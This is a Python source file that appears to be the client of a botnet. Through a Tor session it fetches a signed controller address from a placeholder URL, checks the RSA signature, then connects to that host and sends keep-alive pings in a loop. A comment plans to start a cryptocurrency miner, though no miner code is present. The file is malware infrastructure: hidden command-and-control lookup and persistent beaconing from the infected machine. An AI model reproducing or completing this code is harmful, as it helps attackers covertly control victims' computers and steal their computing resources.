import time

from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from connectionclient import Client
from base64 import urlsafe_b64decode
from sockethelpers.packet import Packet
from Crypto.Signature import PKCS1_v1_5
from customthreading import KillableThread
from torpy.torpy.cell_socket import TorSocketConnectError
from torpy.torpy.http.requests import tor_requests_session


# TODO: start scrypto miner here


hostData = None
LOOP_DELAY = 0.5
PING_DELAY = 3 * 60
HOST_FETCHER = "https://someaddress" # a web address that return the controler address in form 'host:port'

def load_key(filename, password=""):
    with open(filename, 'rb') as f:
        data = f.read()
    key = RSA.importKey(data, password)
    return key


def get_host(hostServer):
    try:
        with tor_requests_session() as s: return s.get(hostServer).text
    except TorSocketConnectError as e:
        time.sleep(PING_DELAY)
        return None

verifier = PKCS1_v1_5.new(load_key("data/pubkey.pem"))
while not hostData:
    hostData = get_host(HOST_FETCHER)
    print("raw data:",hostData)
    og,sig = urlsafe_b64decode(hostData.split(".")[0]), urlsafe_b64decode(hostData.split(".")[1])
    digest = SHA256.new()
    digest.update(og)

    if verifier.verify(digest, sig):
        print('Successfully verified message')
        HOST, PORT= og.decode().split(":")
        PORT = int(PORT)
        break
    else:
        print('Signature verification failed')


print("Connecting to: %s:%s" %(HOST, PORT))


class MainLoop(KillableThread):
    kill = lambda self: super().kill() if self.onClose() else None

    def __init__(self, loopdelay=LOOP_DELAY):
        super().__init__()

        self.count = 0
        self.loopdelay = loopdelay
        self.pingdelay = 0


    def onStart(self):
        self.client = Client(HOST, PORT)
        self.client.start()

    def connect(self):
        self.pingdelay = time.time() + PING_DELAY
        if not self.client.send(Packet("ping")):
            print("No connect, retrying.")
            self.client = Client(HOST, PORT)
            self.client.start()
            return False
        return True


    def onLoop(self):
        if time.time() > self.pingdelay:
            return self.connect()
        return None


    def onClose(self):
        self.client.kill()
        return True


    def run(self):
        self.onStart()
        while True:
            self.onLoop()
            time.sleep(self.loopdelay)
            self.count += 1



if __name__ == '__main__':
    m = MainLoop()
    m.start()
